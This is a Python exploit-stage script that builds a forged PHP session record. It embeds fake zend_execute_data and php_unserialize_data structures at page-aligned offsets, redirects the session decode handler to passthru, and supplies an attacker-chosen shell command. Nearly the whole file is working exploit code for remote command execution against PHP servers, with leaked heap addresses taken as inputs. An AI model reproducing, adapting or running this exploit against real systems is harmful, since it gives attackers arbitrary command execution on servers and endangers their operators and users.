#!/usr/bin/env python3
# Final record builder, delimiter-safe variant.
#
# The proven key-based frame cannot be used on an ASLR base whose heap
# addresses contain 0x7c ('|'), because the php session serializer scans the
# variable *name* for the first '|' delimiter.  This variant keeps the name
# short ("a"/"b") and places the fake zend_execute_data inside the first long
# string value:
#
#   a|i:10731636;b|s:LEN:"<content>";
#
# execute_data = val (start of the decoded buffer, as php_session_decode calls
# decode(ZSTR_VAL(data), ZSTR_LEN(data))).  php_exec_ex reads only:
#   +0x2c num_args, +0x50 arg1 zval value, +0x58 arg1 type.
# The poison int 0xa3c074 is the *first* variable value, so
# var_tmp_var() slot #1 is TARGET (ps_serializers[1].decode).
#
# The fake php_unserialize_data is replicated at every page-aligned offset so
# the builder does not need X1: file offset addr-24 maps to buffer address
# str+addr (val = str+24), and the leaked struct P is page aligned.
import struct, sys

TARGET = 0x22c54c8  # ps_serializers[1].decode (php handler)
NAL = 10731636      # 0xa3c074 == zif_passthru


def solve_L(total):
    L = total
    for _ in range(32):
        prefix = b'a|i:%d;b|s:%d:"' % (NAL, L)
        want = total - len(prefix) - 2
        if want == L:
            return L, prefix
        L = want
    raise RuntimeError('length did not converge')


def build(P, total, cmd, X2, F_OFF=0x400, out_geo=False):
    L, prefix = solve_L(total)
    content = bytearray(b'A' * L)
    cbase = len(prefix)            # content[0] is file offset len(prefix) == val+len(prefix)
    F = X2 + 24 + F_OFF            # zend_string address inside the second decode buffer
    def put(off, data):
        i = off - cbase
        assert i >= 0 and i + len(data) <= L, (hex(off), i, len(data), L, cbase)
        content[i:i + len(data)] = data
    put(0x2c, struct.pack('<I', 1))                 # ZEND_CALL_NUM_ARGS
    put(0x50, struct.pack('<Q', F))                 # arg1 zval value = zend_string*
    put(0x58, struct.pack('<B', 6))                 # arg1 zval type = IS_STRING
    put(F - X2 - 24 + 0x10, struct.pack('<Q', len(cmd)))   # zend_string.len
    put(F - X2 - 24 + 0x18, bytes(cmd) + b'\x00')         # zend_string.val
    # fake php_unserialize_data copies at every page-aligned address
    used = (TARGET - (P + 0x88 + 0x10)) // 16
    ncopies = 0
    for addr_off in range(0x1000, total, 0x1000):
        o = addr_off - 24
        if o < cbase or o + 0x98 > cbase + L:
            continue
        i = o - cbase
        for off, q in ((0, P + 0x38), (8, P + 0x88), (16, P + 0x88),
                       (24, 0), (32, 0), (40, 0), (48, 0x7fffffff),
                       (56, 0), (64, 0)):
            content[i + off:i + off + 8] = struct.pack('<Q', q & 0xffffffffffffffff)
        content[i + 0x88:i + 0x90] = struct.pack('<q', used)
        content[i + 0x90:i + 0x98] = struct.pack('<Q', 0)
        ncopies += 1
    rec = prefix + bytes(content) + b'";'
    assert len(rec) == total, (len(rec), total)
    return rec, dict(P=hex(P), X2=hex(X2), F=hex(F), F_OFF=hex(F_OFF), L=L,
                     prefix=len(prefix), copies=ncopies,
                     used=used, used_hex=hex(used & 0xffffffffffffffff),
                     cmd_len=len(cmd))


if __name__ == '__main__':
    P = int(sys.argv[1], 0)
    total = int(sys.argv[2], 0)
    out = sys.argv[3]
    cmd = sys.argv[4].encode()
    X2 = int(sys.argv[5], 0)
    F_OFF = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0x400
    rec, geo = build(P, total, cmd, X2, F_OFF)
    open(out, 'wb').write(rec)
    print(geo)
